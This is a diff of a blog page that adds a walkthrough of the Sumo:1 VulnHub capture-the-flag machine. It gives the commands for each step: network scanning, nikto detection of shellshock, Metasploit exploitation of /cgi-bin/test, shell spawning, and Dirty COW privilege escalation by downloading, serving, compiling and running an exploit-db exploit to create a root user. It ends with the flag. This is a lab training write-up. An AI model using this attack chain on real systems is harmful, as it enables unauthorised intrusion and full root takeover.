@@ -9,15 +9,15 @@
     <meta name="description" content="">
     <meta name="author" content="">
 
-    <title>Cyber Security Blog</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <title>Walkthrough Sumo: 1</title>
 	
 	<!-- Favicon -->
 	<link rel="shortcut icon" href="img/favicon.ico" type="image/icon"> 
 	<link rel="icon" href="img/favicon.ico" type="image/icon">
-	
+    
+	<!-- Bootstrap Core CSS -->
+    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
     <!-- Theme CSS -->
     <link href="css/clean-blog.min.css" rel="stylesheet">
 
@@ -73,70 +73,124 @@
 
     <!-- Page Header -->
     <!-- Set your background image for this header on the line below. -->
-    <header class="intro-header" style="background-image: url('img/home-bg.jpg')">
+    <header class="intro-header" style="background-image: url('img/post9/Sumo-00.jpg')">
         <div class="container">
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                    <div class="site-heading">
-                        <h1>Cyber Security Blog</h1>
-                        <hr class="small">
-                        <span class="subheading">Walkthrough various CTF etc.</span>
+                    <div class="post-heading">
+                        <h1>SunCSR Team: Sumo</h1>
+                        <h2 class="subheading">Difficulty: Beginner to Intermediate</h2>
+						<span class="meta">Posted by <a href="about.html">Admin</a> on May 19, 2020</span>
                     </div>
                 </div>
             </div>
         </div>
     </header>
 
-    <!-- Main Content -->
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-				
-				<div class="post-preview">
-                    <a href="post4.html">
-                        <h2 class="post-title">
-                            sunset: nightfall
-                        </h2>
-                        <h3 class="post-subtitle">
-							Walkthrough sunset: nightfall vulnhub CTF
-                        </h3>
+    <!-- Post Content -->
+    <article>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <p><a href="https://www.vulnhub.com/entry/sumo-1,480/">CTF link</a></p>
+					
+					<p>Good afternoon, today we will be walkthrough the Sumo_Sun machine from the <a href="https://www.vulnhub.com/author/suncsr-team,696/">SunCSR Team</a>.</p>
+					
+					<li>Goal: Get the root shell i.e.(root@localhost:~#) and then obtain flag under /root).</li>
+					
+					<h2 class="section-heading">Enumeration</h2>
+					
+					<p>First, scan the internal network and find the ip address of our target.</p>
+					
+					<a href="img/post9/image1.png">
+                        <img class="img-responsive" src="img/post9/image1.png" alt="">
                     </a>
-                    <p class="post-meta">Posted by <a href="about.html">Admin</a> on December 12, 2019</p>
-                </div>
-				<hr>
-				<div class="post-preview">
-                    <a href="post2.html">
-                        <h2 class="post-title">
-                            SecTalks: BNE0x02 - Fuku
-                        </h2>
-                        <h3 class="post-subtitle">
-							Walkthrough Fuku vulnhub CTF
-                        </h3>
+					
+					<pre><code>arp-scan -l</code></pre>
+					
+					<p>When scanning ports, we find the apache2 server running on port 80, let's see what it contains.</p>
+                  
+					<a href="img/post9/image2.png">
+                        <img class="img-responsive" src="img/post9/image2.png" alt="">
                     </a>
-                    <p class="post-meta">Posted by <a href="about.html">Admin</a> on December 3, 2019</p>
-                </div>
-				<hr>
-				<div class="post-preview">
-                    <a href="post1.html">
-                        <h2 class="post-title">
-                            hackNos: Os-Hax
-                        </h2>
-                        <h3 class="post-subtitle">
-							Walkthrough Os-Hax vulnhub CTF
-                        </h3>
+					
+					<pre><code>nmap -A -T4 192.168.2.102 > nmap_scan.txt && cat nmap_scan.txt</code></pre>
+                   
+				    <p>And so before us is a regular web page. I will use nikto to find something interesting.</p>
+					
+					<a href="img/post9/image3.png">
+                        <img class="img-responsive" src="img/post9/image3.png" alt="">
                     </a>
-                    <p class="post-meta">Posted by <a href="about.html">Admin</a> on December 2, 2019</p>
-				<hr>
-					<!-- Pager -->
-					<ul class="pager">
-						<li class="previous">
-							<a href="index.html">&larr; 1 page</a> <!-- Older Posts -->
-						</li>
-					</ul>
-                </div>
+					
+					<h2 class="section-heading">Shell</h2>
+					
+					<p>Nikto detected an uncommon header and apparently this is a CVE hint that we need to use, we also see that /cgi-bin/test has a shellshock vulnerability.</p>
+			        
+					<a href="img/post9/image4.png">
+                        <img class="img-responsive" src="img/post9/image4.png" alt="">
+                    </a>
+					
+					<pre><code>nikto -h http://192.168.2.102</code></pre>
+					
+					<p>To exploit this vulnerability, I will use metasploit</p>
+			   
+					<a href="img/post9/image5.png">
+                        <img class="img-responsive" src="img/post9/image5.png" alt="">
+                    </a>
+					
+					<a href="img/post9/image6.png">
+                        <img class="img-responsive" src="img/post9/image6.png" alt="">
+                    </a>
+			   
+					<pre><code>set RHOSTS 192.168.2.102</code></pre>
+					<pre><code>set TARGETURI /cgi-bin/test</code></pre>
+					<pre><code>run</code></pre>
+					<pre><code>shell</code></pre>
+					<pre><code>python -c 'import pty; pty.spawn("/bin/sh")'</code></pre>
+					
+					
+					<h2 class="section-heading">Privilege Escalation</h2>
+					
+					<p>At this stage we successfully got access to the machine as www-data, now we need to get root</p>
+					
+					<p>First, I will check the system for the <a href="https://en.wikipedia.org/wiki/Dirty_COW">dirty cow</a> vulnerability using the <a href="https://github.com/aishee/scan-dirtycow/blob/master/dirtycowscan.sh">dirtycowscan.sh</a> script. As the script showed, the system is vulnerable</p>
+					
+					<a href="img/post9/image7.png">
+                        <img class="img-responsive" src="img/post9/image7.png" alt="">
+                    </a>
+					
+					<p>Using python HTTP Server and wget I deliver <a href="https://www.exploit-db.com/raw/40839">exploit</a> code to our goal. using gcc, I compile the exploit code and get the executable</p>
+					
+					<a href="img/post9/image8.png">
+                        <img class="img-responsive" src="img/post9/image8.png" alt="">
+                    </a>
+					<pre><code>wget https://www.exploit-db.com/raw/40839</code></pre>
+					<pre><code>mv 40839 dirty.c</code></pre>
+					<pre><code>python -m SimpleHTTPServer 91</code></pre>
+					<pre><code>wget http://192.168.2.107:91/dirty.c</code></pre>
+					<pre><code>gcc -pthread dirty.c -o dirty -lcrypt</code></pre>
+					
+					<p>Using the exploit, I created a new root user with the password n3ws3cr3tpass. now i connect to it using ssh</p>
+					
+					<a href="img/post9/image9.png">
+                        <img class="img-responsive" src="img/post9/image9.png" alt="">
+                    </a>
+					<pre><code>./dirty n3ws3cr3tpass</code></pre>
+					<pre><code>firefart:n3ws3cr3tpass</code></pre>
+					
+					<p>And i got root flag</p>
+					
+					<a href="img/post9/image10.png">
+                        <img class="img-responsive" src="img/post9/image10.png" alt="">
+                    </a>
+					
+					<pre><code>{Sum0-SunCSR-2020_r001}</code></pre>
+					
+					
+			    </div>
             </div>
         </div>
-    </div>
+    </article>
 
     <hr>
 
